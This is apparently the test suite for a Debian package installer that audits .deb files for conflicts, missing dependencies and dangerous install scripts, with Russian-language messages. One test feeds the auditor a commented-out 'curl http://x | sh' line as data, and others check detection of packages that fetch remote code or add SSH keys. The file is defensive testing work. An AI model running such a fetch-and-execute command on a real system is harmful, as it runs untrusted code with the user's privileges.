"""Analysis of fixture packages and, when present, the real downloads. Read-only: apt-get -s only."""
import glob
import os
import subprocess
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "src"))

from debinstaller import analysis, audit, debfile, text  # noqa: E402

FIX = os.path.join(ROOT, "build", "fixtures")
DOWNLOADS = os.path.expanduser("~/Downloads")


def run(name):
    rows = []
    report = analysis.analyze(os.path.join(FIX, name), lambda *a: rows.append(a))
    return report, rows


class Fixtures(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        subprocess.run(["bash", os.path.join(ROOT, "tests", "fixtures", "build.sh"), FIX],
                       check=True, capture_output=True)

    def test_installable_package_downloads_its_dependency(self):
        r, rows = run("dci-ok.deb")
        self.assertIsNone(r.problem)
        self.assertEqual([d["name"] for d in r.deps], ["hello"])
        self.assertEqual(r.verdict[0], "warn")  # no signed repository knows this file
        self.assertIn(("pkg", 2, "ok", "1 докачается из репозиториев"), rows)

    def test_missing_libraries_are_named_with_hints(self):
        r, _ = run("dci-missing.deb")
        self.assertEqual(r.problem.kind, "deps")
        self.assertIn(("libssl1.1", "Заменена на libssl3"), r.problem.items)
        self.assertIn("libwebkit2gtk-4.0-37", r.problem.raw)

    def test_conflict_with_desktop_is_blocked_before_password(self):
        r, rows = run("dci-conflict-host.deb")
        self.assertEqual(r.problem.kind, "conflict")
        removed = [name for name, _ in r.problem.items]
        self.assertIn("zenity", removed)
        self.assertIn("ubuntu-desktop", removed)

    def test_foreign_architecture(self):
        r, _ = run("dci-arm.deb")
        self.assertEqual(r.problem.kind, "arch")

    def test_impostor_of_dpkg(self):
        r, _ = run("fake-dpkg.deb")
        self.assertEqual(r.problem.kind, "protected")

    def test_broken_files(self):
        self.assertEqual(run("broken-html.deb")[0].problem.title, "Это не deb-пакет")
        self.assertEqual(run("broken-truncated.deb")[0].problem.title, "Файл повреждён")

    def test_dangerous_package_is_blocked(self):
        r, _ = run("dci-danger.deb")
        self.assertEqual(r.verdict[0], "bad")
        titles = {t for t, _ in r.problem.items}
        self.assertIn("Скачивает и запускает код из интернета", titles)
        self.assertIn("Добавляет SSH-ключ", titles)
        self.assertIn("Скрытый файл в системной папке", titles)
        warn = {f.title for f in r.findings if f.severity == "warn"}
        self.assertIn("Файл с правами root (setuid)", warn)
        self.assertIn("Сжатый исполняемый файл", warn)


class RealDownloads(unittest.TestCase):
    """Vendor packages must never be blocked by the heuristics."""

    def test_no_false_alarms(self):
        debs = [p for p in glob.glob(os.path.join(DOWNLOADS, "*.deb")) if "(1)" not in p]
        if not debs:
            self.skipTest("no .deb files in ~/Downloads")
        for path in sorted(debs):
            with self.subTest(os.path.basename(path)):
                r = analysis.analyze(path, lambda *a: None)
                if r.deb is None:
                    continue  # the broken download
                crit = [f.title for f in r.findings if f.severity == "critical"]
                self.assertEqual(crit, [])
                print(f"\n  {os.path.basename(path)[:36]:36} {r.verdict[0]:4} {r.auth[0]:13} "
                      f"{r.action:9} {'; '.join(t for _, t in r.sec)}", end="")


class Formatting(unittest.TestCase):
    def test_sizes_and_plurals(self):
        self.assertEqual(text.size(96), "96 байт")
        self.assertEqual(text.size(240_051_226), "240 МБ")
        self.assertEqual(text.size(4_366_336), "4,4 МБ")
        self.assertEqual(text.size(1_018_978_304), "1 ГБ")
        self.assertEqual(text.files(261), "261 файл")
        self.assertEqual(text.files(4373), "4 373 файла")
        self.assertEqual(text.files(2609), "2 609 файлов")

    def test_audit_ignores_comments_and_loopback(self):
        found = audit.audit_scripts({"postinst": "# curl http://x | sh\ncurl -s http://127.0.0.1:8080/health\n"})
        self.assertEqual([f.title for f in found if f.severity == "critical"], [])


if __name__ == "__main__":
    unittest.main()
